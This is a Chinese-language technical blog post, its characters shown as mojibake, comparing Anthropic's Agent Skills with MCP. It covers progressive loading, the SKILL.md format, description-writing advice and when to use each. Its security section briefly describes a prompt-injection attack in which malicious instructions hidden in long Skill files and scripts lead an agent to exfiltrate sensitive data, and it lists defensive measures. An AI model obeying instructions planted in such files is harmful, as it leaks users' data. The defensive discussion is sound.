<h3 data-id="heading-13">Skillï¼šä¸Šä¸‹æ–‡å·¥ç¨‹çš„æ¸è¿›å¼å…¬å¼€</h3>
<h4 data-id="heading-14">Skill æ˜¯ä»€ä¹ˆ</h4>
<p>Skillï¼ˆå…¨ç§° Agent Skillï¼‰æ˜¯ Anthropic åœ¨ 2025 å¹´ 10 æœˆå‘å¸ƒçš„ç‰¹æ€§ã€‚å®˜æ–¹å®šä¹‰ï¼š</p>
<blockquote>
<p>"Skills are organized folders of instructions, scripts, and resources that agents can discover and load dynamically to perform better at specific tasks."</p>
</blockquote>
<p>ç¿»è¯‘ä¸€ä¸‹ï¼šSkill æ˜¯ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œé‡Œé¢æ”¾ç€æŒ‡ä»¤ã€è„šæœ¬å’Œèµ„æºï¼ŒAI ä¼šæ ¹æ®éœ€è¦è‡ªåŠ¨å‘ç°å’ŒåŠ è½½ã€‚</p>
<p><strong>Skill åœ¨æ¶æ„å±‚çº§ä¸Šå’Œ MCP ä¸åŒã€‚</strong></p>
<p>ç”¨ Anthropic çš„è¯è¯´ï¼š</p>
<blockquote>
<p>"Skills are at the prompt/knowledge layer, whereas MCP is at the integration layer."</p>
</blockquote>
<p>Skill æ˜¯"æç¤º/çŸ¥è¯†å±‚"ï¼ŒMCP æ˜¯"é›†æˆå±‚"ã€‚ä¸¤è€…è§£å†³ä¸åŒå±‚é¢çš„é—®é¢˜ã€‚</p>
<h4 data-id="heading-15">Skill çš„æ ¸å¿ƒè®¾è®¡ï¼šæ¸è¿›å¼ä¿¡æ¯å…¬å¼€</h4>
<p>Skill æœ€ç²¾å¦™çš„è®¾è®¡æ˜¯<strong>æ¸è¿›å¼ä¿¡æ¯å…¬å¼€</strong>ï¼ˆProgressive Disclosureï¼‰ã€‚è¿™æ˜¯ Anthropic åœ¨ä¸Šä¸‹æ–‡å·¥ç¨‹ï¼ˆContext Engineeringï¼‰é¢†åŸŸçš„é‡è¦å®è·µã€‚</p>
<p>å®˜æ–¹çš„æ¯”å–»ï¼š</p>
<blockquote>
<p>"Like a well-organized manual that starts with a table of contents, then specific chapters, and finally a detailed appendix."</p>
</blockquote>
<p>å°±åƒä¸€æœ¬ç»„ç»‡è‰¯å¥½çš„æ‰‹å†Œï¼šå…ˆçœ‹ç›®å½•ï¼Œå†ç¿»åˆ°ç›¸å…³ç« èŠ‚ï¼Œæœ€åæŸ¥é˜…é™„å½•ã€‚</p>
<p>Skill åˆ†ä¸‰å±‚åŠ è½½ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    subgraph L1["ç¬¬ 1 å±‚ï¼šå…ƒæ•°æ®ï¼ˆå§‹ç»ˆåŠ è½½ï¼‰"]
        A[Skill åç§° + æè¿°]
        B["çº¦ 100 tokens"]
    end

    subgraph L2["ç¬¬ 2 å±‚ï¼šæ ¸å¿ƒæŒ‡ä»¤ï¼ˆæŒ‰éœ€åŠ è½½ï¼‰"]
        C[SKILL.md å®Œæ•´å†…å®¹]
        D["é€šå¸¸ &lt; 5k tokens"]
    end

    subgraph L3["ç¬¬ 3+ å±‚ï¼šæ”¯æŒæ–‡ä»¶ï¼ˆæ·±åº¦æŒ‰éœ€ï¼‰"]
        E[reference.md]
        F[scripts/helper.py]
        G[templates/...]
    end

    L1 --&gt; |"Claude åˆ¤æ–­ç›¸å…³"| L2
    L2 --&gt; |"éœ€è¦æ›´å¤šä¿¡æ¯"| L3

    style L1 fill:#d4edda,stroke:#28a745
    style L2 fill:#fff3cd,stroke:#ffc107
    style L3 fill:#cce5ff,stroke:#0d6efd
</code></pre>
<p><strong>è¿™ä¸ªè®¾è®¡çš„å¥½å¤„æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<p>ä¼ ç»Ÿæ–¹å¼ï¼ˆæ¯”å¦‚ MCPï¼‰åœ¨ä¼šè¯å¼€å§‹æ—¶å°±æŠŠæ‰€æœ‰ä¿¡æ¯åŠ è½½åˆ°ä¸Šä¸‹æ–‡ã€‚å¦‚æœä½ æœ‰ 10 ä¸ª MCP Serverï¼Œæ¯ä¸ªæš´éœ² 5 ä¸ªå·¥å…·ï¼Œé‚£å°±æ˜¯ 50 ä¸ªå·¥å…·å®šä¹‰â€”â€”å¯èƒ½æ¶ˆè€—æ•°åƒç”šè‡³ä¸Šä¸‡ Tokenã€‚</p>
<p>Skill çš„æ¸è¿›å¼åŠ è½½è®©ä½ å¯ä»¥æœ‰å‡ åä¸ª Skillï¼Œä½†åŒæ—¶åªåŠ è½½ä¸€ä¸¤ä¸ªã€‚<strong>ä¸Šä¸‹æ–‡æ•ˆç‡å¤§å¹…æå‡ã€‚</strong></p>
<p>ç”¨å®˜æ–¹çš„è¯è¯´ï¼š</p>
<blockquote>
<p>"This means that the amount of context that can be bundled into a skill is effectively unbounded."</p>
</blockquote>
<p>ç†è®ºä¸Šï¼Œå•ä¸ª Skill å¯ä»¥åŒ…å«æ— é™é‡çš„çŸ¥è¯†â€”â€”å› ä¸ºåªæœ‰éœ€è¦çš„éƒ¨åˆ†æ‰ä¼šè¢«åŠ è½½ã€‚</p>
<h4 data-id="heading-16">ä¸Šä¸‹æ–‡å·¥ç¨‹ï¼šSkill èƒŒåçš„æ€æƒ³</h4>
<p>Skill æ˜¯ Anthropic "ä¸Šä¸‹æ–‡å·¥ç¨‹"ï¼ˆContext Engineeringï¼‰ç†å¿µçš„äº§ç‰©ã€‚å®˜æ–¹å¯¹æ­¤æœ‰ä¸“é—¨çš„é˜è¿°ï¼š</p>
<blockquote>
<p>"At Anthropic, we view context engineering as the natural progression of prompt engineering. Prompt engineering refers to methods for writing and organizing LLM instructions for optimal outcomes. Context engineering refers to the set of strategies for curating and maintaining the optimal set of tokens (information) during LLM inference."</p>
</blockquote>
<p>ç®€å•è¯´ï¼š</p>
<ul>
<li><strong>Prompt Engineering</strong>ï¼šæ€ä¹ˆå†™å¥½æç¤ºè¯</li>
<li><strong>Context Engineering</strong>ï¼šæ€ä¹ˆç®¡ç†ä¸Šä¸‹æ–‡çª—å£é‡Œçš„ä¿¡æ¯</li>
</ul>
<p>LLM çš„ä¸Šä¸‹æ–‡çª—å£æ˜¯æœ‰é™çš„ï¼ˆå³ä½¿æ˜¯ 200k çª—å£ï¼Œä¹Ÿä¼šè¢«å¤§é‡ä¿¡æ¯æ’‘çˆ†ï¼‰ã€‚Context Engineering çš„æ ¸å¿ƒé—®é¢˜æ˜¯ï¼š<strong>åœ¨æœ‰é™çš„çª—å£é‡Œï¼Œæ”¾ä»€ä¹ˆä¿¡æ¯èƒ½è®© AI è¡¨ç°æœ€å¥½ï¼Ÿ</strong></p>
<p>Skill çš„æ¸è¿›å¼åŠ è½½å°±æ˜¯ Context Engineering çš„å…·ä½“å®è·µâ€”â€”åªåŠ è½½å½“å‰ä»»åŠ¡éœ€è¦çš„ä¿¡æ¯ï¼Œè®©æ¯ä¸€ä¸ª Token éƒ½å‘æŒ¥æœ€å¤§ä»·å€¼ã€‚</p>
<h4 data-id="heading-17">Skill çš„è§¦å‘æœºåˆ¶</h4>
<p>Skill æ˜¯<strong>è‡ªåŠ¨è§¦å‘</strong>çš„ï¼Œè¿™æ˜¯å®ƒå’Œ Slash Command çš„å…³é”®åŒºåˆ«ã€‚</p>
<p>å·¥ä½œæµç¨‹ï¼š</p>
<ol>
<li><strong>æ‰«æé˜¶æ®µ</strong>ï¼šClaude è¯»å–æ‰€æœ‰ Skill çš„å…ƒæ•°æ®ï¼ˆåç§° + æè¿°ï¼‰</li>
<li><strong>åŒ¹é…é˜¶æ®µ</strong>ï¼šå°†ç”¨æˆ·è¯·æ±‚ä¸ Skill æè¿°è¿›è¡Œè¯­ä¹‰åŒ¹é…</li>
<li><strong>åŠ è½½é˜¶æ®µ</strong>ï¼šå¦‚æœåŒ¹é…æˆåŠŸï¼ŒåŠ è½½å®Œæ•´çš„ SKILL.md</li>
<li><strong>æ‰§è¡Œé˜¶æ®µ</strong>ï¼šæŒ‰ç…§ Skill é‡Œçš„æŒ‡ä»¤æ‰§è¡Œä»»åŠ¡ï¼ŒæŒ‰éœ€åŠ è½½æ”¯æŒæ–‡ä»¶</li>
</ol>
<p>ç”¨æˆ·ä¸éœ€è¦æ˜¾å¼è°ƒç”¨ã€‚æ¯”å¦‚ä½ æœ‰ä¸€ä¸ª <code>code-review</code> Skillï¼Œç”¨æˆ·è¯´"å¸®æˆ‘ review è¿™æ®µä»£ç "ï¼ŒClaude ä¼šè‡ªåŠ¨åŒ¹é…å¹¶åŠ è½½ã€‚</p>
<p><strong>Skill çš„æœ¬è´¨æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<p>æŠ€æœ¯ä¸Šï¼ŒSkill æ˜¯ä¸€ä¸ª<strong>å…ƒå·¥å…·</strong>ï¼ˆMeta-toolï¼‰ï¼š</p>
<blockquote>
<p>"The Skill tool is a meta-tool that manages all skills. Traditional tools like Read, Bash, or Write execute discrete actions and return immediate results. Skills operate differentlyâ€”rather than performing actions directly, they inject specialized instructions into the conversation history and dynamically modify Claude's execution environment."</p>
</blockquote>
<p>Skill ä¸æ˜¯æ‰§è¡Œå…·ä½“åŠ¨ä½œï¼Œè€Œæ˜¯<strong>æ³¨å…¥æŒ‡ä»¤</strong>åˆ°å¯¹è¯å†å²ä¸­ï¼ŒåŠ¨æ€ä¿®æ”¹ Claude çš„æ‰§è¡Œç¯å¢ƒã€‚</p>
<h4 data-id="heading-18">Skill çš„æ–‡ä»¶ç»“æ„</h4>
<p>ä¸€ä¸ªæ ‡å‡†çš„ Skill é•¿è¿™æ ·ï¼š</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-keyword">my</span>-skill/
â”œâ”€â”€ SKILL.md              <span class="hljs-comment"># å¿…éœ€ï¼šå…ƒæ•°æ® + ä¸»è¦æŒ‡ä»¤</span>
â”œâ”€â”€ reference.md          <span class="hljs-comment"># å¯é€‰ï¼šè¯¦ç»†å‚è€ƒæ–‡æ¡£</span>
â”œâ”€â”€ examples.md           <span class="hljs-comment"># å¯é€‰ï¼šä½¿ç”¨ç¤ºä¾‹</span>
â”œâ”€â”€ scripts/
â”‚   â””â”€â”€ helper.py         <span class="hljs-comment"># å¯é€‰ï¼šå¯æ‰§è¡Œè„šæœ¬</span>
â””â”€â”€ templates/
    â””â”€â”€ template.txt      <span class="hljs-comment"># å¯é€‰ï¼šæ¨¡æ¿æ–‡ä»¶</span>
</code></pre>
<p><code>SKILL.md</code> æ˜¯æ ¸å¿ƒï¼Œå¿…é¡»åŒ…å« YAML æ ¼å¼çš„å…ƒæ•°æ®ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-meta">---</span>
<span class="hljs-attr">name:</span> <span class="hljs-string">code-review</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">&gt;
  Review code for bugs, security issues, and style violations.
  Use when asked to review code, check for bugs, or audit PRs.
</span><span class="hljs-meta">---
</span>
<span class="hljs-comment"># Code Review Skill</span>

<span class="hljs-comment">## Instructions</span>

<span class="hljs-string">When</span> <span class="hljs-string">reviewing</span> <span class="hljs-string">code,</span> <span class="hljs-attr">follow these steps:</span>

<span class="hljs-number">1</span><span class="hljs-string">.</span> <span class="hljs-string">First</span> <span class="hljs-string">check</span> <span class="hljs-string">for</span> <span class="hljs-string">security</span> <span class="hljs-string">vulnerabilities...</span>
<span class="hljs-number">2</span><span class="hljs-string">.</span> <span class="hljs-string">Then</span> <span class="hljs-string">check</span> <span class="hljs-string">for</span> <span class="hljs-string">performance</span> <span class="hljs-string">issues...</span>
<span class="hljs-number">3</span><span class="hljs-string">.</span> <span class="hljs-string">Finally</span> <span class="hljs-string">check</span> <span class="hljs-string">for</span> <span class="hljs-string">code</span> <span class="hljs-string">style...</span>
</code></pre>
<p><strong>å…³é”®å­—æ®µï¼š</strong></p>
<ul>
<li><code>name</code>ï¼šSkill çš„å”¯ä¸€æ ‡è¯†ï¼Œå°å†™å­—æ¯ + æ•°å­— + è¿å­—ç¬¦ï¼Œæœ€å¤š 64 å­—ç¬¦</li>
<li><code>description</code>ï¼šæè¿°åšä»€ä¹ˆã€ä»€ä¹ˆæ—¶å€™ç”¨ï¼Œæœ€å¤š 1024 å­—ç¬¦</li>
</ul>
<p><code>description</code> çš„è´¨é‡ç›´æ¥å†³å®š Skill èƒ½ä¸èƒ½è¢«æ­£ç¡®è§¦å‘ã€‚</p>
<h4 data-id="heading-19">Skill çš„å®‰å…¨è€ƒè™‘</h4>
<p>Skill æœ‰ä¸€ä¸ªæ½œåœ¨çš„å®‰å…¨é—®é¢˜ï¼š<strong>Prompt Injection</strong>ã€‚</p>
<p>ç ”ç©¶äººå‘˜å‘ç°ï¼š</p>
<blockquote>
<p>"Although Agent Skills can be a very useful tool, they are fundamentally insecure since they enable trivially simple prompt injections. Researchers demonstrated how to hide malicious instructions in long Agent Skill files and referenced scripts to exfiltrate sensitive data."</p>
</blockquote>
<p>å› ä¸º Skill æœ¬è´¨ä¸Šæ˜¯æ³¨å…¥æŒ‡ä»¤ï¼Œæ¶æ„çš„ Skill å¯ä»¥åœ¨é•¿æ–‡ä»¶ä¸­éšè—æ¶æ„æŒ‡ä»¤ï¼Œçªƒå–æ•æ„Ÿæ•°æ®ã€‚</p>
<p><strong>åº”å¯¹æªæ–½ï¼š</strong></p>
<ol>
<li><strong>åªä½¿ç”¨å¯ä¿¡æ¥æºçš„ Skill</strong></li>
<li><strong>å®¡æŸ¥ Skill ä¸­çš„è„šæœ¬</strong></li>
<li><strong>ä½¿ç”¨ <code>allowed-tools</code> é™åˆ¶ Skill çš„èƒ½åŠ›èŒƒå›´</strong></li>
</ol>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-meta">---</span>
<span class="hljs-attr">name:</span> <span class="hljs-string">safe-file-reader</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">Read</span> <span class="hljs-string">and</span> <span class="hljs-string">analyze</span> <span class="hljs-string">files</span> <span class="hljs-string">without</span> <span class="hljs-string">making</span> <span class="hljs-string">changes</span>
<span class="hljs-attr">allowed-tools:</span> <span class="hljs-string">Read,</span> <span class="hljs-string">Grep,</span> <span class="hljs-string">Glob</span>  <span class="hljs-comment"># åªå…è®¸è¯»æ“ä½œ</span>
<span class="hljs-meta">---
</span></code></pre>
<h4 data-id="heading-20">Skill çš„å¹³å°æ”¯æŒ</h4>
<p>Agent Skills ç›®å‰æ”¯æŒï¼š</p>
<ul>
<li>Claude.aiï¼ˆProã€Maxã€Teamã€Enterpriseï¼‰</li>
<li>Claude Code</li>
<li>Claude Agent SDK</li>
<li>Claude Developer Platform</li>
</ul>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<strong>Skill ç›®å‰æ˜¯ Anthropic ç”Ÿæ€ä¸“å±</strong>çš„ï¼Œä¸åƒ MCP æ˜¯è·¨å¹³å°çš„å¼€æ”¾åè®®ã€‚</p>
<h3 data-id="heading-21">MCP vs Skillï¼šæ¶æ„å±‚çº§å¯¹æ¯”</h3>
<p>ç°åœ¨æˆ‘ä»¬å¯ä»¥ä»æ¶æ„å±‚çº§æ¥ç†è§£ä¸¤è€…çš„åŒºåˆ«ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                     ç”¨æˆ·è¯·æ±‚                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                         â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                  æç¤º/çŸ¥è¯†å±‚ (Skill)                     â”‚
â”‚                                                          â”‚
â”‚   Skill æ³¨å…¥ä¸“ä¸šçŸ¥è¯†å’Œå·¥ä½œæµç¨‹                           â”‚
â”‚   <span class="hljs-string">"æ€ä¹ˆåšæŸç±»ä»»åŠ¡"</span>                                       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                         â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    LLM æ¨ç†å±‚                            â”‚
â”‚                                                          â”‚
â”‚   Claude / GPT / Gemini ç­‰                              â”‚
â”‚   ç†è§£è¯·æ±‚ï¼Œå†³å®šéœ€è¦ä»€ä¹ˆå·¥å…·                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                         â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                  é›†æˆå±‚ (MCP)                            â”‚
â”‚                                                          â”‚
â”‚   MCP è¿æ¥å¤–éƒ¨ç³»ç»Ÿ                                       â”‚
â”‚   <span class="hljs-string">"èƒ½è®¿é—®ä»€ä¹ˆå·¥å…·å’Œæ•°æ®"</span>                                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                         â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                   å¤–éƒ¨ä¸–ç•Œ                               â”‚
â”‚                                                          â”‚
â”‚   æ•°æ®åº“ã€APIã€æ–‡ä»¶ç³»ç»Ÿã€ç¬¬ä¸‰æ–¹æœåŠ¡                      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>Skill åœ¨ä¸Šå±‚ï¼ˆçŸ¥è¯†å±‚ï¼‰ï¼ŒMCP åœ¨ä¸‹å±‚ï¼ˆé›†æˆå±‚ï¼‰ã€‚</strong></p>
<p>ä¸¤è€…ä¸æ˜¯æ›¿ä»£å…³ç³»ï¼Œè€Œæ˜¯äº’è¡¥å…³ç³»ã€‚ä½ å¯ä»¥ï¼š</p>
<ul>
<li>ç”¨ MCP è¿æ¥ GitHub</li>
<li>ç”¨ Skill æ•™ AI å¦‚ä½•æŒ‰ç…§å›¢é˜Ÿè§„èŒƒåš Code Review</li>
</ul>
<h3 data-id="heading-22">è¯¦ç»†å¯¹æ¯”è¡¨</h3>

































































<table><thead><tr><th>ç»´åº¦</th><th>MCP</th><th>Skill</th></tr></thead><tbody><tr><td><strong>æ ¸å¿ƒä½œç”¨</strong></td><td>è¿æ¥å¤–éƒ¨ç³»ç»Ÿ</td><td>ç¼–ç ä¸“ä¸šçŸ¥è¯†å’Œæ–¹æ³•è®º</td></tr><tr><td><strong>æ¶æ„å±‚çº§</strong></td><td>é›†æˆå±‚</td><td>æç¤º/çŸ¥è¯†å±‚</td></tr><tr><td><strong>åè®®åŸºç¡€</strong></td><td>JSON-RPC 2.0</td><td>æ–‡ä»¶ç³»ç»Ÿ + Markdown</td></tr><tr><td><strong>è·¨å¹³å°</strong></td><td>æ˜¯ï¼ˆå¼€æ”¾åè®®ï¼Œå¤šå¹³å°æ”¯æŒï¼‰</td><td>å¦ï¼ˆç›®å‰ Anthropic ç”Ÿæ€ä¸“å±ï¼‰</td></tr><tr><td><strong>è§¦å‘æ–¹å¼</strong></td><td>æŒä¹…è¿æ¥ï¼Œéšæ—¶å¯ç”¨</td><td>åŸºäºæè¿°çš„è¯­ä¹‰åŒ¹é…ï¼Œè‡ªåŠ¨è§¦å‘</td></tr><tr><td><strong>Token æ¶ˆè€—</strong></td><td>é«˜ï¼ˆå·¥å…·å®šä¹‰æŒä¹…å ç”¨ä¸Šä¸‹æ–‡ï¼‰</td><td>ä½ï¼ˆæ¸è¿›å¼åŠ è½½ï¼‰</td></tr><tr><td><strong>å¤–éƒ¨è®¿é—®</strong></td><td>å¯ä»¥ç›´æ¥è®¿é—®å¤–éƒ¨ç³»ç»Ÿ</td><td>ä¸èƒ½ç›´æ¥è®¿é—®ï¼Œéœ€è¦é…åˆ MCP æˆ–å†…ç½®å·¥å…·</td></tr><tr><td><strong>å¤æ‚åº¦</strong></td><td>é«˜ï¼ˆéœ€è¦ç†è§£åè®®ã€è¿è¡Œ Serverï¼‰</td><td>ä½ï¼ˆå†™ Markdown å°±è¡Œï¼‰</td></tr><tr><td><strong>å¯å¤ç”¨æ€§</strong></td><td>é«˜ï¼ˆæ ‡å‡†åŒ–åè®®ï¼Œè·¨åº”ç”¨å¤ç”¨ï¼‰</td><td>ä¸­ï¼ˆæ–‡ä»¶å¤¹ï¼Œå¯ä»¥ Git å…±äº«ï¼‰</td></tr><tr><td><strong>åŠ¨æ€å‘ç°</strong></td><td>æ˜¯ï¼ˆè¿è¡Œæ—¶å‘ç°å¯ç”¨å·¥å…·ï¼‰</td><td>æ˜¯ï¼ˆè¿è¡Œæ—¶å‘ç°å¯ç”¨ Skillï¼‰</td></tr><tr><td><strong>å®‰å…¨è€ƒè™‘</strong></td><td>å¤–éƒ¨å†…å®¹å¸¦æ¥ prompt injection é£é™©</td><td>Skill æ–‡ä»¶æœ¬èº«å¯èƒ½åŒ…å«æ¶æ„æŒ‡ä»¤</td></tr></tbody></table>
<h3 data-id="heading-23">ä»€ä¹ˆæ—¶å€™ç”¨ MCPï¼Œä»€ä¹ˆæ—¶å€™ç”¨ Skill</h3>
<h4 data-id="heading-24">ç”¨ MCP çš„åœºæ™¯</h4>
<ul>
<li><strong>éœ€è¦è®¿é—®å¤–éƒ¨æ•°æ®</strong>ï¼šæ•°æ®åº“æŸ¥è¯¢ã€API è°ƒç”¨ã€æ–‡ä»¶ç³»ç»Ÿè®¿é—®</li>
<li><strong>éœ€è¦æ“ä½œå¤–éƒ¨ç³»ç»Ÿ</strong>ï¼šåˆ›å»º GitHub Issueã€å‘é€ Slack æ¶ˆæ¯ã€æ‰§è¡Œ SQL</li>
<li><strong>éœ€è¦å®æ—¶ä¿¡æ¯</strong>ï¼šç›‘æ§ç³»ç»ŸçŠ¶æ€ã€æŸ¥çœ‹æ—¥å¿—ã€æœç´¢å¼•æ“ç»“æœ</li>
<li><strong>éœ€è¦è·¨å¹³å°å¤ç”¨</strong>ï¼šåŒä¸€ä¸ªå·¥å…·åœ¨ Claude Desktopã€Cursorã€å…¶ä»–æ”¯æŒ MCP çš„åº”ç”¨ä¸­ä½¿ç”¨</li>
</ul>
<h4 data-id="heading-25">ç”¨ Skill çš„åœºæ™¯</h4>
<ul>
<li><strong>é‡å¤æ€§çš„å·¥ä½œæµç¨‹</strong>ï¼šä»£ç å®¡æŸ¥ã€æ–‡æ¡£ç”Ÿæˆã€æ•°æ®åˆ†æ</li>
<li><strong>å…¬å¸å†…éƒ¨è§„èŒƒ</strong>ï¼šä»£ç é£æ ¼ã€æäº¤è§„èŒƒã€æ–‡æ¡£æ ¼å¼</li>
<li><strong>éœ€è¦å¤šæ­¥éª¤çš„å¤æ‚ä»»åŠ¡</strong>ï¼šéœ€è¦è¯¦ç»†æŒ‡å¯¼çš„ä¸“ä¸šä»»åŠ¡</li>
<li><strong>å›¢é˜Ÿå…±äº«çš„æœ€ä½³å®è·µ</strong>ï¼šæ ‡å‡†åŒ–çš„æ“ä½œæµç¨‹</li>
<li><strong>Token æ•æ„Ÿåœºæ™¯</strong>ï¼šéœ€è¦å¤§é‡çŸ¥è¯†ä½†ä¸æƒ³ä¸€ç›´å ç”¨ä¸Šä¸‹æ–‡</li>
</ul>
<h4 data-id="heading-26">ç»“åˆä½¿ç”¨</h4>
<p>å¾ˆå¤šæ—¶å€™ï¼Œä¸¤è€…æ˜¯é…åˆä½¿ç”¨çš„ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">ç”¨æˆ·ï¼š"Review PR <span class="hljs-selector-id">#456</span> å¹¶æŒ‰ç…§å›¢é˜Ÿè§„èŒƒç»™å‡ºå»ºè®®"

<span class="hljs-number">1</span>. MCP (GitHub) è·å– PR ä¿¡æ¯
        â†“
<span class="hljs-number">2</span>. Skill (å›¢é˜Ÿä»£ç å®¡æŸ¥è§„èŒƒ) æä¾›å®¡æŸ¥æ–¹æ³•è®º
        â†“
<span class="hljs-number">3</span>. Claude æŒ‰ç…§ Skill çš„æŒ‡ä»¤åˆ†æä»£ç 
        â†“
<span class="hljs-number">4</span>. MCP (GitHub) æäº¤è¯„è®º
</code></pre>
<p><strong>MCP è´Ÿè´£"èƒ½è®¿é—®ä»€ä¹ˆ"ï¼ŒSkill è´Ÿè´£"æ€ä¹ˆåš"ã€‚</strong></p>
<h3 data-id="heading-27">å†™å¥½ Skill çš„å…³é”®</h3>
<p>Skill èƒ½ä¸èƒ½è¢«æ­£ç¡®è§¦å‘ï¼Œ90% å–å†³äº <code>description</code> å†™å¾—å¥½ä¸å¥½ã€‚</p>
<h4 data-id="heading-28">å·®çš„ description</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">description:</span> <span class="hljs-string">Helps</span> <span class="hljs-string">with</span> <span class="hljs-string">data</span>
</code></pre>
<p>å¤ªå®½æ³›ï¼ŒClaude ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™è¯¥ç”¨ã€‚</p>
<h4 data-id="heading-29">å¥½çš„ description</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">description:</span> <span class="hljs-string">&gt;
  Analyze Excel spreadsheets, generate pivot tables, and create charts.
  Use when working with Excel files (.xlsx), spreadsheets, or tabular data analysis.
  Triggers on: "analyze spreadsheet", "create pivot table", "Excel chart"
</span></code></pre>
<p>å¥½çš„ description åº”è¯¥åŒ…å«ï¼š</p>
<ol>
<li><strong>åšä»€ä¹ˆ</strong>ï¼šå…·ä½“çš„èƒ½åŠ›æè¿°</li>
<li><strong>ä»€ä¹ˆæ—¶å€™ç”¨</strong>ï¼šæ˜ç¡®çš„è§¦å‘åœºæ™¯</li>
<li><strong>è§¦å‘è¯</strong>ï¼šç”¨æˆ·å¯èƒ½è¯´çš„å…³é”®è¯</li>
</ol>
<h4 data-id="heading-30">æœ€ä½³å®è·µ</h4>
<p>å®˜æ–¹å»ºè®®ï¼š</p>
<ol>
<li><strong>ä¿æŒä¸“æ³¨</strong>ï¼šä¸€ä¸ª Skill åšä¸€ä»¶äº‹ï¼Œé¿å…å®½æ³›çš„è·¨åŸŸ Skill</li>
<li><strong>SKILL.md æ§åˆ¶åœ¨ 500 è¡Œä»¥å†…</strong>ï¼šå¤ªé•¿çš„è¯æ‹†åˆ†åˆ°æ”¯æŒæ–‡ä»¶</li>
<li><strong>æµ‹è¯•è§¦å‘è¡Œä¸º</strong>ï¼šç¡®è®¤ç›¸å…³è¯·æ±‚èƒ½è§¦å‘ï¼Œä¸ç›¸å…³è¯·æ±‚ä¸ä¼šè¯¯è§¦å‘</li>
<li><strong>ç‰ˆæœ¬æ§åˆ¶</strong>ï¼šè®°å½• Skill çš„å˜æ›´å†å²</li>
</ol>
<h3 data-id="heading-31">å…³äº Slash Command</h3>
<p>æ–‡ç« æ ‡é¢˜æ˜¯ MCP vs Skillï¼Œä½†å¾ˆå¤šäººä¹Ÿä¼šé—®åˆ° Slash Commandï¼Œç®€å•è¯´ä¸€ä¸‹ã€‚</p>
